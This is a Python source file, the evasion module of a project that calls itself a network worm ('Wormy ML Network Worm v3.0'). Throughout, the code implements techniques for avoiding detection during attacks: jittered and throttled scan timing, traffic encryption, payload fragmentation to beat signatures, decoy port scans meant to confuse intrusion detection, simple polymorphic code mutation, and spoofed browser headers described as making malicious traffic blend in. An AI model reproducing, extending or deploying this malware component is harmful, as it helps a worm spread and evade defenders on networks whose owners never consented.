"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Stealth Engine
Advanced evasion techniques for avoiding detection
"""


import os
import random
import sys
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger

try:
    from utils.crypto_utils import CryptoManager

    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False


class StealthEngine:
    """Implements advanced evasion techniques"""

    def __init__(self, config):
        self.config = config
        self.crypto = None
        if CRYPTO_AVAILABLE:
            try:
                self.crypto = CryptoManager()
            except Exception:
                pass
        self.last_action_time = {}
        self.action_count = {}

        logger.info(
            "Stealth Engine initialized",
            {
                "stealth_mode": config.evasion.stealth_mode,
                "randomize_timing": config.evasion.randomize_timing,
            },
        )

    def get_scan_delay(self, target: str = None) -> float:
        """
        Calculate delay before next scan

        Implements adaptive timing to avoid detection
        """
        if not self.config.evasion.randomize_timing:
            return 0.0

        base_delay = 0.5  # Base delay in seconds

        if self.config.evasion.stealth_mode:
            # Stealth mode: longer, more random delays
            delay = random.uniform(1.0, 5.0)
        else:
            # Normal mode: shorter delays
            delay = random.uniform(0.1, 1.0)

        # Adaptive delay based on target
        if target and target in self.action_count:
            # Increase delay for frequently scanned targets
            count = self.action_count[target]
            delay += min(count * 0.5, 10.0)  # Max 10 seconds additional

        return delay

    def apply_timing_jitter(self, base_time: float) -> float:
        """
        Add random jitter to timing

        Prevents pattern detection
        """
        if not self.config.evasion.randomize_timing:
            return base_time

        jitter = random.uniform(-0.3, 0.3) * base_time
        return max(0.1, base_time + jitter)

    def should_throttle(self, target: str) -> bool:
        """
        Determine if we should throttle actions on target

        Prevents rate-based detection
        """
        if target not in self.last_action_time:
            return False

        last_time = self.last_action_time[target]
        elapsed = (datetime.now() - last_time).total_seconds()

        # Throttle if last action was too recent
        min_interval = 2.0 if self.config.evasion.stealth_mode else 0.5

        return elapsed < min_interval

    def record_action(self, target: str, action_type: str):
        """Record action for timing analysis"""
        self.last_action_time[target] = datetime.now()
        self.action_count[target] = self.action_count.get(target, 0) + 1

        logger.log_evasion(
            "Action_Recorded",
            f"{action_type} on {target}",
            {"target": target, "action": action_type, "count": self.action_count[target]},
        )

    def obfuscate_traffic(self, data: bytes) -> bytes:
        """
        Obfuscate network traffic

        Makes traffic analysis harder
        """
        if not self.config.evasion.encrypt_traffic:
            return data

        # Encrypt data
        key = self.crypto.generate_symmetric_key()
        encrypted = self.crypto.encrypt_symmetric(data, key)

        logger.log_evasion(
            "Traffic_Obfuscation",
            "Data encrypted",
            {"original_size": len(data), "encrypted_size": len(encrypted)},
        )

        return encrypted

    def fragment_payload(self, payload: bytes, fragment_size: int = 64) -> List[bytes]:
        """
        Fragment payload into smaller chunks

        Evades signature-based detection
        """
        fragments = []

        for i in range(0, len(payload), fragment_size):
            fragment = payload[i : i + fragment_size]
            fragments.append(fragment)

        logger.log_evasion(
            "Payload_Fragmentation",
            f"Split into {len(fragments)} fragments",
            {
                "original_size": len(payload),
                "fragment_count": len(fragments),
                "fragment_size": fragment_size,
            },
        )

        return fragments

    def randomize_user_agent(self) -> str:
        """
        Generate random User-Agent string

        Evades User-Agent based detection
        """
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        ]

        return random.choice(user_agents)

    def use_decoy_scans(self, target: str, real_ports: List[int]) -> List[int]:
        """
        Mix real scans with decoy scans

        Confuses IDS about actual intent
        """
        if not self.config.evasion.stealth_mode:
            return real_ports

        # Add decoy ports
        decoy_ports = random.sample(range(1, 65535), min(10, len(real_ports)))

        # Mix real and decoy
        all_ports = list(set(real_ports + decoy_ports))
        random.shuffle(all_ports)

        logger.log_evasion(
            "Decoy_Scans",
            f"Added {len(decoy_ports)} decoy ports",
            {"target": target, "real_ports": len(real_ports), "decoy_ports": len(decoy_ports)},
        )

        return all_ports

    def polymorphic_mutation(self, code: str) -> str:
        """
        Apply polymorphic mutation to code

        Changes code structure while maintaining functionality
        """
        # Simple mutations
        mutations = []

        # Add random comments
        if random.random() < 0.5:
            comment = f"# {random.randint(10000, 99999)}"
            mutations.append(comment)

        # Add random whitespace
        if random.random() < 0.5:
            mutations.append("\n" * random.randint(1, 3))

        # Insert mutations at random positions
        lines = code.split("\n")
        for mutation in mutations:
            pos = random.randint(0, len(lines))
            lines.insert(pos, mutation)

        mutated = "\n".join(lines)

        logger.log_evasion(
            "Polymorphic_Mutation",
            "Code mutated",
            {"original_lines": len(code.split("\n")), "mutated_lines": len(mutated.split("\n"))},
        )

        return mutated

    def mimic_legitimate_traffic(self) -> Dict[str, str]:
        """
        Generate headers that mimic legitimate traffic

        Makes malicious traffic blend in
        """
        headers = {
            "User-Agent": self.randomize_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }

        # Add random legitimate headers
        if random.random() < 0.5:
            headers["Referer"] = f"https://www.google.com/search?q={random.randint(1000, 9999)}"

        if random.random() < 0.3:
            headers["DNT"] = "1"

        return headers

    def slow_scan_mode(self, target: str, ports: List[int], callback) -> List[int]:
        """
        Perform extremely slow scan to avoid detection

        Scans one port at a time with long delays
        """
        logger.info(f"Stealth: Starting slow scan of {target}")

        results = []

        for port in ports:
            # Long delay between ports
            delay = self.get_scan_delay(target)
            time.sleep(delay)

            # Scan single port
            result = callback(target, [port])
            if result:
                results.extend(result)

            # Record action
            self.record_action(target, f"scan_port_{port}")

        logger.log_evasion(
            "Slow_Scan",
            f"Completed slow scan of {target}",
            {"target": target, "ports_scanned": len(ports), "ports_found": len(results)},
        )

        return results

    def get_statistics(self) -> Dict:
        """Get evasion statistics"""
        return {
            "targets_tracked": len(self.last_action_time),
            "total_actions": sum(self.action_count.values()),
            "stealth_mode": self.config.evasion.stealth_mode,
            "traffic_encryption": self.config.evasion.encrypt_traffic,
        }


if __name__ == "__main__":
    import os
    import sys

    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    try:
        from configs.config import Config
    except ImportError:
        from config import Config

    config = Config()
    config.evasion.stealth_mode = True
    config.evasion.randomize_timing = True

    stealth = StealthEngine(config)

    # Test timing
    print("Testing timing delays:")
    for i in range(5):
        delay = stealth.get_scan_delay("192.168.1.100")
        print(f"  Delay {i+1}: {delay:.2f}s")

    # Test obfuscation
    print("\nTesting traffic obfuscation:")
    data = b"malicious payload"
    obfuscated = stealth.obfuscate_traffic(data)
    print(f"  Original: {len(data)} bytes")
    print(f"  Obfuscated: {len(obfuscated)} bytes")

    # Test headers
    print("\nTesting legitimate headers:")
    headers = stealth.mimic_legitimate_traffic()
    for key, value in headers.items():
        print(f"  {key}: {value[:50]}...")

    print(f"\nStatistics: {stealth.get_statistics()}")
